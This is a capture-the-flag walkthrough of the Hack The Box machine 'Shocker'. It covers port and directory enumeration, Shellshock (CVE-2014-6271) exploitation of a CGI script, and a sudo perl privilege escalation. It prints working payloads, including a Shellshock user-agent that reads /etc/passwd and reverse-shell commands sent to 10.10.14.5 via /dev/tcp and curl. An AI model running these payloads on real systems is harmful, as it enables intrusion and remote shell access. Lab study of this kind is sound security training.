# Shocker
**Machine ip:** 10.10.10.56

## Enumeration
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.56 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.56`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c189963f-1f1f-47e3-8143-3c3590c67d76)
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6d921d69-f5a3-4b01-8abf-b2705292468b)

+ Navigate to `http://10.10.10.56/`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/53721866-1078-4c64-a195-7717114fc1a3)

+ Fuzzing:
```
feroxbuster -u http://10.10.10.56 -x html,php,json,js,sh,cgi,pl,docx,pdf,txt -w /usr/share/wordlists/dirb/common.txt --depth 2 --filter-status 403,404,500 -r --extract-links
```
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3a9ac037-a36f-41a4-9778-b82bdc5dbbc4)

+ Check `/cgi-bin/user.sh`: `curl http://10.10.10.56/cgi-bin/user.sh`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/47df5820-0a25-4802-a8fb-a4a987b0ad8e)

+ [Shellshock vulnerability](https://github.com/opsxcq/exploit-CVE-2014-6271): [CVE-2014-6271](https://github.com/b4keSn4ke/CVE-2014-6271)
+ `nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bc9402cf-aee0-410f-b78c-9ac7069a0151)
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/15545c15-606a-4e45-8555-0d886bd63fc2)

+ Make a request `http://10.10.10.56/cgi-bin/user.sh` and capture the request on burp.
+ Send to repeater, and then trigger.
+ Use `() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'` payload on the user-agent.
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2d99b17d-fdb0-422b-bbf9-94be92bbb3b9)

Get a revershell: 
+ `nc -lnvp 4444`
+ `() { :;}; /bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/33347aa2-8d52-4ecc-bdd1-eefabc6550f0)
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a66c0774-5e34-43b9-a1e5-522fc5dd4399)

Alternatively, use `curl`: 
+ `curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://10.10.10.56/cgi-bin/user.sh`
+ `nc -lnvp 5555`
```
curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >& /dev/tcp/10.10.14.5/5555 0>&1" http://10.10.10.56/cgi-bin/user.sh
```
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/998447b4-78ef-40c0-929c-17cfbd01c157)

+ `sudo -l -l`
+ Check [gtfobins](https://gtfobins.github.io/) for [perl](https://gtfobins.github.io/gtfobins/perl/#sudo)
+ Get root.
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c4f85588-6979-435d-b7ef-466ca66b7e4d)

# References & Alternatives:
+ https://vvmlist.github.io/#shock
+ https://0xdf.gitlab.io/2021/05/25/htb-shocker.html
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/shocker-writeup-w-o-metasploit
+ https://infosecwriteups.com/shocker-from-hackthebox-52378519fb5b
+ https://corruptedprotocol.medium.com/shocker-hackthebox-htb-2cdac3cf3562
+ https://www.linkedin.com/pulse/hack-box-htb-shocker-walkthrough-abdulhakim-öner
